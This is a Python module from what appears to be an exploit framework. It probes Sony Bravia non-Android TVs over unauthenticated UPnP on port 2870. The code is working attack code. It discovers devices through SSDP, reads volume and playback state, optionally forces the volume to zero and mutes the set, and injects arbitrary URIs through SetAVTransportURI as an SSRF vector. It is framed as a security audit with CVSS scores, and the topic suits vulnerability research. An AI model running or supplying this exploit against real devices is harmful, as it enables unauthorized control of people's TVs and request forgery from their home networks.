# Author: André Henrique (@mrhenrike) | União Geek
"""Sony Bravia — Unauthenticated UPnP DLNA MediaRenderer Security Audit Scanner.

Probes the Sony Bravia non-Android TV UPnP MediaRenderer service (IPI/1.0,
TCP port 2870) for unauthenticated access vulnerabilities:

  1. SSDP discovery to detect the service and extract device UUID
  2. Device descriptor (dmr.xml) enumeration
  3. Service capability disclosure (GetProtocolInfo)
  4. Unauthenticated volume read (GetVolume)
  5. Unauthenticated transport state read (GetTransportInfo)
  6. Unauthorized volume write test (SetVolume)
  7. Unauthorized mute test (SetMute)
  8. URI injection test (SetAVTransportURI — SSRF prerequisite)

CONFIRMED AFFECTED:
  Sony Bravia KDL-50W665F v7.631-4.000-0106 (firmware 2023-02-14)
  Port 2870 active in standby mode, no authentication required.

CVSSv3.1 (unauthorized control): AV:A/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L = 6.3
CVSSv3.1 (SSRF when TV on):     AV:A/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N = 6.1

CVE: Candidate — no assigned CVE for this specific attack class on non-Android Bravia
Version: 1.0.0
"""
import socket
import time
from typing import Optional

from embedxpl.core.exploit import *
from embedxpl.core.http.http_client import HTTPClient

_UPNP_PORT      = 2870
_SSDP_ADDR      = "239.255.255.250"
_SSDP_PORT      = 1900
_SSDP_TIMEOUT   = 4

_RC_SVC  = "urn:schemas-upnp-org:service:RenderingControl:1"
_AVT_SVC = "urn:schemas-upnp-org:service:AVTransport:1"
_CM_SVC  = "urn:schemas-upnp-org:service:ConnectionManager:1"

_SOAP_ENVELOPE = (
    '<?xml version="1.0" encoding="utf-8"?>'
    '<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" '
    's:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">'
    "<s:Body>{}</s:Body></s:Envelope>"
)

_SSDP_SEARCH = (
    b"M-SEARCH * HTTP/1.1\r\n"
    b"HOST: 239.255.255.250:1900\r\n"
    b'MAN: "ssdp:discover"\r\n'
    b"MX: 3\r\n"
    b"ST: ssdp:all\r\n\r\n"
)


def _soap_xml(service, action, inner):
    return _SOAP_ENVELOPE.format(
        f'<u:{action} xmlns:u="{service}">{inner}</u:{action}>'
    )


class Exploit(HTTPClient):
    """Sony Bravia Unauthenticated UPnP DLNA Scanner.

    Discovers and audits the Sony Bravia non-Android TV UPnP MediaRenderer
    service (IPI/1.0) on port 2870 for unauthenticated access to volume
    control, state disclosure, and AVTransport URI injection (SSRF vector).

    Author: André Henrique (@mrhenrike) | União Geek
    Version: 1.0.0
    """

    __info__ = {
        "name": "Sony Bravia Unauthenticated UPnP DLNA Scanner",
        "description": (
            "Discovers and audits Sony Bravia non-Android TV UPnP MediaRenderer "
            "service on port 2870 for unauthenticated volume control, state "
            "disclosure (GetVolume/GetTransportInfo), unauthorized write access "
            "(SetVolume/SetMute), and AVTransport URI injection (SSRF vector). "
            "Service is active even when TV is in standby mode."
        ),
        "authors": (
            "André Henrique (@mrhenrike) | União Geek",
        ),
        "references": (
            "http://schemas.xmlsoap.org/soap/envelope/",
            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-11889",
            "http://www.upnp.org/specs/av/UPnP-av-AVTransport-v1-Service.pdf",
        ),
        "devices": ("Sony Bravia",),
    }

    target      = OptIP("", "Target IPv4 address of the Sony Bravia TV")
    port        = OptPort(_UPNP_PORT, "UPnP MediaRenderer port (default 2870)")
    test_write  = OptBool(False, "Perform write tests (SetVolume, SetMute) — may affect TV")
    ssrf_uri    = OptString("", "URI to inject via SetAVTransportURI (leave empty to skip)")
    timeout     = OptInteger(8, "HTTP request timeout (seconds)")

    def run(self) -> None:
        """Execute the Sony Bravia UPnP security audit."""
        print_status(f"Auditing UPnP on {self.target}:{self.port}")

        # SSDP discovery
        uuid = self._ssdp_discover()
        if uuid:
            print_success(f"SSDP response from {self.target} (UUID: {uuid})")
        else:
            print_warning("No SSDP response (TV may be fully off or on different subnet)")

        # Device descriptor
        desc = self._fetch_descriptor()
        if desc:
            print_success(f"Device descriptor: {desc[:80]}")

        # Service capability disclosure
        proto = self._get_protocol_info()
        if proto:
            print_success(f"GetProtocolInfo: {len(proto)} chars of sink protocols exposed (no auth)")

        # Volume read (information disclosure)
        vol = self._get_volume()
        if vol is not None:
            print_success(f"GetVolume: Current volume = {vol} (unauthenticated)")
        else:
            print_error("GetVolume not accessible (TV fully off or service unavailable)")

        # Transport state (information disclosure)
        state = self._get_transport_info()
        if state:
            print_success(f"GetTransportInfo: State={state} (unauthenticated)")

        # Write tests (optional)
        if str(self.test_write).lower() in ("true", "1", "yes"):
            if self._set_volume(0):
                print_success("SetVolume(0): ACCEPTED without authentication (HIGH SEVERITY)")
            if self._set_mute(True):
                print_success("SetMute(True): ACCEPTED without authentication")

        # SSRF test
        ssrf = str(self.ssrf_uri).strip()
        if ssrf:
            if self._set_av_transport_uri(ssrf):
                print_success(
                    f"SetAVTransportURI accepted: {ssrf} (SSRF possible when TV is on)"
                )

    def _soap_request(self, service, action, inner_xml, control_path):
        """Send a UPnP SOAP action request."""
        body = _soap_xml(service, action, inner_xml).encode("utf-8")
        try:
            resp = self.http_request(
                "POST",
                f"/{str(int(self.port))}/{control_path}".replace(f"//{int(self.port)}/", "/"),
                data=body,
                headers={
                    "SOAPACTION": f'"{service}#{action}"',
                    "Content-Type": 'text/xml; charset="utf-8"',
                    "User-Agent": "EmbedXPL-Forge/1.0",
                },
                timeout=int(self.timeout),
            )
            return resp
        except Exception:
            return None

    def _soap_post(self, service, action, inner_xml, control_path):
        """Send SOAP via raw socket to bypass HTTPClient port binding."""
        import urllib.request
        soap = _soap_xml(service, action, inner_xml)
        req = urllib.request.Request(
            f"http://{self.target}:{int(self.port)}/{control_path}",
            data=soap.encode("utf-8"),
            headers={
                "SOAPACTION": f'"{service}#{action}"',
                "Content-Type": 'text/xml; charset="utf-8"',
                "User-Agent": "EmbedXPL-Forge/1.0",
            },
            method="POST",
        )
        try:
            with urllib.request.urlopen(req, timeout=int(self.timeout)) as r:
                return r.read().decode("utf-8", errors="replace")
        except Exception:
            return None

    def _ssdp_discover(self) -> str | None:
        """Send SSDP M-SEARCH and return device UUID if TV responds."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
            sock.settimeout(_SSDP_TIMEOUT)
            sock.sendto(_SSDP_SEARCH, (_SSDP_ADDR, _SSDP_PORT))
            sock.sendto(_SSDP_SEARCH, (str(self.target), _SSDP_PORT))
            end = time.time() + _SSDP_TIMEOUT
            while time.time() < end:
                try:
                    data, addr = sock.recvfrom(4096)
                    resp = data.decode("utf-8", errors="replace")
                    if addr[0] == str(self.target):
                        for line in resp.split("\r\n"):
                            if line.upper().startswith("USN:") and "uuid:" in line.lower():
                                return line.split("uuid:")[-1].split(":")[0].strip()
                        return "discovered"
                except TimeoutError:
                    break
            sock.close()
        except Exception:
            pass
        return None

    def _fetch_descriptor(self) -> str | None:
        """Fetch the UPnP device descriptor XML."""
        import urllib.request
        for path in ("/description.xml", "/dmr.xml", "/rootDesc.xml", "/"):
            try:
                with urllib.request.urlopen(
                    f"http://{self.target}:{int(self.port)}{path}",
                    timeout=int(self.timeout),
                ) as r:
                    snippet = r.read(512).decode("utf-8", errors="replace")
                    if "MediaRenderer" in snippet or "deviceType" in snippet:
                        return snippet[:256]
            except Exception:
                continue
        return None

    def _get_protocol_info(self) -> str | None:
        resp = self._soap_post(
            _CM_SVC, "GetProtocolInfo",
            f'<u:GetProtocolInfo xmlns:u="{_CM_SVC}"></u:GetProtocolInfo>',
            "control/ConnectionManager"
        )
        if resp and "Sink" in resp:
            import re
            m = re.search(r"<Sink>([^<]+)</Sink>", resp)
            return m.group(1) if m else resp[:100]
        return None

    def _get_volume(self) -> int | None:
        resp = self._soap_post(
            _RC_SVC, "GetVolume",
            f'<u:GetVolume xmlns:u="{_RC_SVC}"><InstanceID>0</InstanceID>'
            "<Channel>Master</Channel></u:GetVolume>",
            "control/RenderingControl"
        )
        if resp and "CurrentVolume" in resp:
            import re
            m = re.search(r"<CurrentVolume>(\d+)</CurrentVolume>", resp)
            if m:
                return int(m.group(1))
        return None

    def _get_transport_info(self) -> str | None:
        resp = self._soap_post(
            _AVT_SVC, "GetTransportInfo",
            f'<u:GetTransportInfo xmlns:u="{_AVT_SVC}"><InstanceID>0</InstanceID>'
            "</u:GetTransportInfo>",
            "control/AVTransport"
        )
        if resp and "CurrentTransportState" in resp:
            import re
            m = re.search(r"<CurrentTransportState>([^<]+)</CurrentTransportState>", resp)
            return m.group(1) if m else "present"
        return None

    def _set_volume(self, vol) -> bool:
        resp = self._soap_post(
            _RC_SVC, "SetVolume",
            f'<u:SetVolume xmlns:u="{_RC_SVC}"><InstanceID>0</InstanceID>'
            f"<Channel>Master</Channel><DesiredVolume>{vol}</DesiredVolume>"
            "</u:SetVolume>",
            "control/RenderingControl"
        )
        return bool(resp and "SetVolumeResponse" in resp)

    def _set_mute(self, mute) -> bool:
        val = "1" if mute else "0"
        resp = self._soap_post(
            _RC_SVC, "SetMute",
            f'<u:SetMute xmlns:u="{_RC_SVC}"><InstanceID>0</InstanceID>'
            f"<Channel>Master</Channel><DesiredMute>{val}</DesiredMute>"
            "</u:SetMute>",
            "control/RenderingControl"
        )
        return bool(resp and "SetMuteResponse" in resp)

    def _set_av_transport_uri(self, uri) -> bool:
        resp = self._soap_post(
            _AVT_SVC, "SetAVTransportURI",
            f'<u:SetAVTransportURI xmlns:u="{_AVT_SVC}"><InstanceID>0</InstanceID>'
            f"<CurrentURI>{str(uri)}</CurrentURI>"
            "<CurrentURIMetaData></CurrentURIMetaData>"
            "</u:SetAVTransportURI>",
            "control/AVTransport"
        )
        return bool(resp and "SetAVTransportURIResponse" in resp)

    @mute
    def check(self) -> bool:
        """Check if UPnP MediaRenderer is accessible on the target."""
        import urllib.request
        for path in ("/description.xml", "/dmr.xml", "/"):
            try:
                with urllib.request.urlopen(
                    f"http://{self.target}:{int(self.port)}{path}",
                    timeout=5,
                ) as r:
                    content = r.read(256).decode("utf-8", errors="replace")
                    if "MediaRenderer" in content or "sony" in content.lower():
                        return True
            except Exception:
                continue
        return self._get_volume() is not None
